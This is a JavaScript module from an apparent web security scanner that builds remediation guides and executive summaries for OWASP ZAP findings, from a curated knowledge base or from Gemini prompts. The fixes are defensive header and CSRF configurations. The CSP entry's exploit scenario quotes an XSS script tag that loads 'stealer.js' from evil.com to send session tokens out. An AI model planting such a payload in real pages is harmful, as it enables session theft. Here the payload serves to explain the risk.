const { GoogleGenAI } = require('@google/genai');

const GEMINI_API_KEY = process.env.GEMINI_API_KEY || '';

// Initialize Gemini client if API key is available
let aiClient = null;
if (GEMINI_API_KEY) {
  try {
    aiClient = new GoogleGenAI({ apiKey: GEMINI_API_KEY });
  } catch (err) {
    console.warn('Failed to initialize Google Gen AI client:', err.message);
  }
}

/**
 * Built-in expert remediation database for common vulnerabilities.
 * Used as instant, reliable fallback when GEMINI_API_KEY is not configured or rate-limited.
 */
const BUILTIN_REMEDIATIONS = {
  clickjacking: {
    cwe: 'CWE-1021: Improper Restriction of Rendered UI Layers (Clickjacking)',
    summary:
      'Clickjacking occurs when an attacker embeds your website inside a transparent or hidden iframe on a malicious site, tricking users into clicking buttons or links they did not intend to click (e.g., submitting forms, transferring funds, or changing account settings).',
    impact:
      'Attackers can hijack user interactions, authorize unauthorized transactions, or capture keystrokes through disguised overlay elements.',
    exploitScenario:
      'An attacker hosts a malicious website with a tempting game or prize button. Beneath the button, your authenticated site is framed invisibly. When the user clicks to "Play", they unknowingly click "Confirm Payment" or "Delete Account" on your site.',
    codeFixes: [
      {
        language: 'Node.js (Express)',
        framework: 'Helmet / Express Middleware',
        code: `// Install: npm install helmet
const express = require('express');
const helmet = require('helmet');
const app = express();

// Set X-Frame-Options to DENY or SAMEORIGIN
app.use(helmet.frameguard({ action: 'sameorigin' }));

// Alternatively, set via Content-Security-Policy
app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      frameAncestors: ["'self'"], // Blocks third-party iframing
    },
  })
);`,
        explanation: 'Uses Helmet to set both X-Frame-Options: SAMEORIGIN and CSP frame-ancestors: \'self\'.',
      },
      {
        language: 'Nginx',
        framework: 'nginx.conf',
        code: `# Inside your server {} block in /etc/nginx/nginx.conf:
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self';" always;`,
        explanation: 'Forces Nginx to append clickjacking protection headers to all HTTP/HTTPS responses.',
      },
      {
        language: 'Apache',
        framework: '.htaccess / httpd.conf',
        code: `# Inside your .htaccess or VirtualHost:
<IfModule mod_headers.c>
    Header always set X-Frame-Options "SAMEORIGIN"
    Header always set Content-Security-Policy "frame-ancestors 'self';"
</IfModule>`,
        explanation: 'Configures Apache mod_headers to deliver anti-clickjacking headers.',
      },
      {
        language: 'PHP',
        framework: 'Native PHP Header',
        code: `<?php
// Call at the very top before any output
header('X-Frame-Options: SAMEORIGIN');
header("Content-Security-Policy: frame-ancestors 'self';");
?>`,
        explanation: 'Emits the header directly in PHP before HTML execution begins.',
      },
    ],
    verification:
      'Run in your terminal: curl -I https://your-site.com\nVerify that "X-Frame-Options: SAMEORIGIN" or "Content-Security-Policy: frame-ancestors \'self\';" appears in response headers.',
  },

  csrf: {
    cwe: 'CWE-352: Cross-Site Request Forgery (CSRF)',
    summary:
      'Cross-Site Request Forgery (CSRF) allows a malicious website to transmit unauthorized commands from a user that the web application trusts, exploiting stored session cookies.',
    impact:
      'Attackers can change user emails, reset passwords, make purchases, or modify critical data without user awareness.',
    exploitScenario:
      'A logged-in user visits an attacker\'s blog containing an automatic hidden POST form targeting your site. Because the user has active cookies, the browser sends them, and your server executes the state-changing request.',
    codeFixes: [
      {
        language: 'Node.js (Express)',
        framework: 'csurf / csurf alternative or double-submit cookie',
        code: `// Modern approach using SameSite cookies + CSRF tokens
const express = require('express');
const session = require('express-session');
const crypto = require('crypto');
const app = express();

app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    httpOnly: true,
    secure: true, // Requires HTTPS
    sameSite: 'strict', // Blocks cross-site cookie sending
  }
}));

// Middleware to generate & verify anti-CSRF token on POST/PUT/DELETE
app.use((req, res, next) => {
  if (['GET', 'HEAD', 'OPTIONS'].includes(req.method)) return next();
  const token = req.headers['x-csrf-token'] || req.body._csrf;
  if (!token || token !== req.session.csrfToken) {
    return res.status(403).json({ error: 'Invalid or missing CSRF token' });
  }
  next();
});`,
        explanation: 'Enforces SameSite=Strict cookies and checks per-request cryptographic anti-CSRF tokens.',
      },
      {
        language: 'HTML / Blade / EJS',
        framework: 'Form Token Injection',
        code: `<form action="/account/update" method="POST">
  <!-- Hidden Anti-CSRF Token -->
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
  
  <input type="email" name="email" value="user@example.com" />
  <button type="submit">Update Email</button>
</form>`,
        explanation: 'Embeds the secret token into every form submittal.',
      },
    ],
    verification:
      'Attempt submitting a state-changing POST request without the CSRF token header or with an invalid token. The server must reject it with HTTP 403 Forbidden.',
  },

  csp: {
    cwe: 'CWE-1021 / CWE-79: Missing Content Security Policy (CSP)',
    summary:
      'Content Security Policy (CSP) is a declarative HTTP header that restricts which scripts, styles, images, and fonts a browser is allowed to load and execute on your page.',
    impact:
      'Without CSP, an attacker who finds a Cross-Site Scripting (XSS) vulnerability can easily load remote malicious scripts, exfiltrate passwords, or steal session tokens.',
    exploitScenario:
      'An attacker injects `<script src="https://evil.com/stealer.js"></script>` into a comment. Without CSP, the browser downloads and runs the external script, sending all session tokens to the attacker.',
    codeFixes: [
      {
        language: 'Node.js (Express)',
        framework: 'Helmet CSP',
        code: `const express = require('express');
const helmet = require('helmet');
const app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://trusted-cdn.com"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      imgSrc: ["'self'", "data:", "https:"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  })
);`,
        explanation: 'Defines a strict whitelist of content sources for scripts, styles, fonts, and images.',
      },
      {
        language: 'Nginx',
        framework: 'nginx.conf',
        code: `add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'; object-src 'none'; upgrade-insecure-requests;" always;`,
        explanation: 'Emits a solid baseline CSP policy for all served assets.',
      },
    ],
    verification:
      'Inspect page headers in Chrome DevTools Network tab. Check that Content-Security-Policy is present. Check Console tab for any CSP violation reports.',
  },

  hsts: {
    cwe: 'CWE-319: Cleartext Transmission of Sensitive Information (Missing HSTS)',
    summary:
      'HTTP Strict Transport Security (HSTS) informs web browsers that the site must exclusively be accessed using HTTPS, preventing SSL stripping and protocol downgrade attacks.',
    impact:
      'Man-in-the-Middle (MitM) attackers on public Wi-Fi networks can downgrade HTTPS connections to unencrypted HTTP and intercept credentials.',
    exploitScenario:
      'A user on coffee shop Wi-Fi types "http://yoursite.com". An attacker intercepts the initial unencrypted HTTP redirect and intercepts passwords before HTTPS is established.',
    codeFixes: [
      {
        language: 'Node.js (Express)',
        framework: 'Helmet HSTS',
        code: `const helmet = require('helmet');

// MaxAge in seconds: 1 year = 31536000 seconds
app.use(
  helmet.hsts({
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  })
);`,
        explanation: 'Instructs the browser to strictly remember HTTPS for 1 year across all subdomains.',
      },
      {
        language: 'Nginx',
        framework: 'nginx.conf',
        code: `add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;`,
        explanation: 'Adds the official HSTS header to all Nginx responses.',
      },
    ],
    verification:
      'Run: curl -I https://your-site.com\nVerify that "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload" is returned.',
  },

  cookie_samesite: {
    cwe: 'CWE-1275: Sensitive Cookie with Improper SameSite Attribute',
    summary:
      'Cookies without an explicit `SameSite` attribute (or set to `None` without `Secure`) can be sent in third-party contexts, enabling CSRF and timing attacks.',
    impact:
      'Session cookies are automatically dispatched on cross-origin requests, leaving authenticated endpoints vulnerable to cross-site forging.',
    exploitScenario:
      'An attacker lures a user to click a link on a phishing forum. The browser includes your site\'s session cookie with the request because SameSite was not set to Lax or Strict.',
    codeFixes: [
      {
        language: 'Node.js (Express)',
        framework: 'express-session / cookie-parser',
        code: `res.cookie('token', jwtToken, {
  httpOnly: true,     // Prevents JavaScript access (XSS protection)
  secure: true,       // Only transmitted over HTTPS
  sameSite: 'lax',    // 'lax' for general sites or 'strict' for high-security APIs
  maxAge: 86400000,   // 24 hours
});`,
        explanation: 'Enforces httpOnly, secure, and SameSite=lax on all issued authentication cookies.',
      },
      {
        language: 'PHP',
        framework: 'setcookie()',
        code: `<?php
setcookie('session_token', $token, [
    'expires' => time() + 86400,
    'path' => '/',
    'domain' => 'yourdomain.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Lax' // or 'Strict'
]);
?>`,
        explanation: 'Native PHP 7.3+ cookie configuration with security flags.',
      },
    ],
    verification:
      'Inspect cookies in Chrome DevTools (Application > Cookies). Check that SameSite is set to Lax or Strict, and Secure & HttpOnly checkmarks are enabled.',
  },

  x_content_type_options: {
    cwe: 'CWE-79 / CWE-434: Missing X-Content-Type-Options Header',
    summary:
      'The `X-Content-Type-Options: nosniff` header prevents browsers from MIME-sniffing a response away from the declared content-type, stopping attackers from executing user-uploaded images or text files as executable JavaScript.',
    impact:
      'Attackers can disguise malicious executable code inside image or text files and trick the browser into executing it.',
    exploitScenario:
      'An attacker uploads an avatar image containing JavaScript. Without `nosniff`, an older browser might sniff the HTML/JS inside the JPG and execute it in the victim\'s session.',
    codeFixes: [
      {
        language: 'Node.js (Express)',
        framework: 'Helmet / Native Header',
        code: `const helmet = require('helmet');
app.use(helmet.noSniff()); // Sets X-Content-Type-Options: nosniff`,
        explanation: 'Enables nosniff header globally in Express.',
      },
      {
        language: 'Nginx',
        framework: 'nginx.conf',
        code: `add_header X-Content-Type-Options "nosniff" always;`,
        explanation: 'Configures Nginx to apply nosniff to all responses.',
      },
    ],
    verification:
      'Run: curl -I https://your-site.com\nEnsure "X-Content-Type-Options: nosniff" is present.',
  },
};

/**
 * Match vulnerability name to built-in knowledge base keys.
 */
const findBuiltinRemediation = (vulnName = '') => {
  const lower = vulnName.toLowerCase();
  if (lower.includes('clickjack') || lower.includes('frame-ancestors') || lower.includes('x-frame-options')) {
    return BUILTIN_REMEDIATIONS.clickjacking;
  }
  if (lower.includes('csrf') || lower.includes('cross-site request forgery') || lower.includes('anti-csrf')) {
    return BUILTIN_REMEDIATIONS.csrf;
  }
  if (lower.includes('csp') || lower.includes('content security policy')) {
    return BUILTIN_REMEDIATIONS.csp;
  }
  if (lower.includes('hsts') || lower.includes('strict-transport-security')) {
    return BUILTIN_REMEDIATIONS.hsts;
  }
  if (lower.includes('samesite') || lower.includes('cookie')) {
    return BUILTIN_REMEDIATIONS.cookie_samesite;
  }
  if (lower.includes('content-type') || lower.includes('sniff')) {
    return BUILTIN_REMEDIATIONS.x_content_type_options;
  }
  return null;
};

/**
 * Generate AI-powered vulnerability remediation using Gemini API (or intelligent fallback).
 */
const generateVulnerabilityRemediation = async ({
  name,
  description,
  severity,
  solution,
  url,
  targetUrl,
}) => {
  const fallback = findBuiltinRemediation(name);

  // If Gemini API is not configured, return high-quality built-in remediation
  if (!aiClient || !GEMINI_API_KEY) {
    if (fallback) {
      return {
        ...fallback,
        generatedBy: 'PenAI Security Engine (Curated Expert Knowledgebase)',
      };
    }
    // Generic fallback for uncommon findings
    return {
      cwe: 'Security Finding',
      summary: description || `This vulnerability (${name}) was identified during active penetration testing.`,
      impact: `Potential unauthorized access or misconfiguration risk rated as ${severity}.`,
      exploitScenario: `An attacker targeting ${targetUrl || url || 'this application'} could leverage this finding to explore further attack vectors.`,
      codeFixes: [
        {
          language: 'Configuration / Best Practice',
          framework: 'Standard Security Remediation',
          code: solution || 'Implement standard defense-in-depth controls and input/output sanitation.',
          explanation: solution || 'Review application server configuration and patch dependencies.',
        },
      ],
      verification: `Verify using automated testing tools or cURL against ${url || targetUrl}.`,
      generatedBy: 'PenAI Security Engine',
    };
  }

  // Use Google Gemini API
  try {
    const prompt = `You are a Principal Application Security Architect and Lead Penetration Tester.
Analyze this security finding from an OWASP ZAP penetration test and provide an actionable, production-grade remediation guide.

VULNERABILITY DETAILS:
- Name: ${name}
- Severity: ${severity}
- Description: ${description || 'None provided'}
- Tool Solution Hint: ${solution || 'None provided'}
- Affected URL: ${url || targetUrl || 'Not specified'}

Respond with ONLY valid JSON (no markdown ticks, no commentary) matching this schema:
{
  "cwe": "CWE-ID and full name",
  "summary": "Clear, plain-English explanation of what this vulnerability is and why it exists",
  "impact": "Detailed explanation of real-world business and technical impact if exploited",
  "exploitScenario": "Realistic step-by-step attacker scenario explaining how a hacker would exploit it",
  "codeFixes": [
    {
      "language": "Node.js (Express) | Nginx | Apache | PHP | Python | etc.",
      "framework": "Framework or Config name",
      "code": "Production-ready, copy-pasteable code fix with comments",
      "explanation": "Brief explanation of how the code resolves the risk"
    }
  ],
  "verification": "Exact terminal cURL command or browser inspection steps to verify the fix works"
}`;

    const response = await aiClient.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: prompt,
    });

    const rawText = response.text || '';
    // Clean potential markdown code fences from response
    const jsonText = rawText.replace(/```json/gi, '').replace(/```/g, '').trim();
    const parsed = JSON.parse(jsonText);

    return {
      ...parsed,
      generatedBy: 'Google Gemini AI (gemini-2.5-flash)',
    };
  } catch (err) {
    console.warn('Gemini API call failed, falling back to curated knowledgebase:', err.message);
    if (fallback) {
      return {
        ...fallback,
        generatedBy: 'PenAI Security Engine (Fallback)',
      };
    }
    throw err;
  }
};

/**
 * Generate Executive AI Summary & Action Plan for an entire scan.
 */
const generateExecutiveSummary = async ({
  targetUrl,
  score,
  severity,
  scanTime,
  vulnerabilities = [],
}) => {
  const vulnList = vulnerabilities
    .slice(0, 15)
    .map((v, i) => `${i + 1}. [${v.severity || 'Medium'}] ${v.name}: ${v.description || ''}`)
    .join('\n');

  if (!aiClient || !GEMINI_API_KEY) {
    return {
      executiveBrief: `Security assessment of ${targetUrl} completed with a security score of ${score}/100 (${severity} risk profile). The automated penetration testing engine detected ${vulnerabilities.length} security finding(s). Immediate priority should be given to resolving missing HTTP security headers and enforcing strict transport protections.`,
      topPriorities: [
        'Implement Content-Security-Policy (CSP) and Anti-Clickjacking headers across all endpoints.',
        'Enforce HTTP Strict Transport Security (HSTS) with subdomains and preload.',
        'Review and harden all session cookies with SameSite=Lax/Strict, HttpOnly, and Secure flags.',
      ],
      threatPosture: score >= 70 ? 'Low Risk — Good baseline security with minor hardening recommendations.' : score >= 45 ? 'Moderate Risk — Several security defenses missing that leave the application vulnerable to injection or session manipulation.' : 'Critical Risk — Essential security controls are absent. Exploitable pathways exist for cross-site attacks.',
      developerChecklist: [
        'Install and configure Helmet (or equivalent server security header middleware).',
        'Add anti-CSRF token verification on all state-changing endpoints.',
        'Audit third-party scripts and apply Subresource Integrity (SRI) hashes.',
        'Re-run PenAI security scan to verify 100/100 score post-remediation.',
      ],
      generatedBy: 'PenAI Security Engine (Standard Briefing)',
    };
  }

  try {
    const prompt = `You are a Chief Information Security Officer (CISO) and Lead Security Analyst.
Generate an Executive Security Assessment & Action Plan for this web penetration test.

TARGET: ${targetUrl}
SECURITY SCORE: ${score} / 100
SEVERITY: ${severity}
TOTAL FINDINGS: ${vulnerabilities.length}

DETECTED VULNERABILITIES:
${vulnList || 'No critical vulnerabilities detected.'}

Respond with ONLY valid JSON (no markdown ticks, no commentary) matching this schema:
{
  "executiveBrief": "2-3 concise paragraphs summarizing the overall security assessment, root causes, and business risk in clear terms for stakeholders.",
  "topPriorities": [
    "Priority 1 actionable item",
    "Priority 2 actionable item",
    "Priority 3 actionable item"
  ],
  "threatPosture": "Clear description of the current threat posture and attacker feasibility",
  "developerChecklist": [
    "Actionable step 1 for developers",
    "Actionable step 2 for developers",
    "Actionable step 3 for developers",
    "Actionable step 4 for developers"
  ]
}`;

    const response = await aiClient.models.generateContent({
      model: 'gemini-2.5-flash',
      contents: prompt,
    });

    const rawText = response.text || '';
    const jsonText = rawText.replace(/```json/gi, '').replace(/```/g, '').trim();
    const parsed = JSON.parse(jsonText);

    return {
      ...parsed,
      generatedBy: 'Google Gemini AI (gemini-2.5-flash)',
    };
  } catch (err) {
    console.warn('Gemini Executive Summary failed, using fallback:', err.message);
    return {
      executiveBrief: `Automated assessment of ${targetUrl} recorded a security score of ${score}/100 with ${vulnerabilities.length} vulnerabilities. Addressing the highlighted headers and session controls will restore a strong defense posture.`,
      topPriorities: [
        'Deploy Content Security Policy (CSP) headers.',
        'Enable HSTS with max-age=31536000.',
        'Secure session cookies with SameSite and HttpOnly.',
      ],
      threatPosture: `${severity} Risk profile.`,
      developerChecklist: [
        'Apply security header middleware.',
        'Validate anti-CSRF measures.',
        'Re-test with PenAI.',
      ],
      generatedBy: 'PenAI Security Engine (Fallback)',
    };
  }
};

module.exports = {
  generateVulnerabilityRemediation,
  generateExecutiveSummary,
};
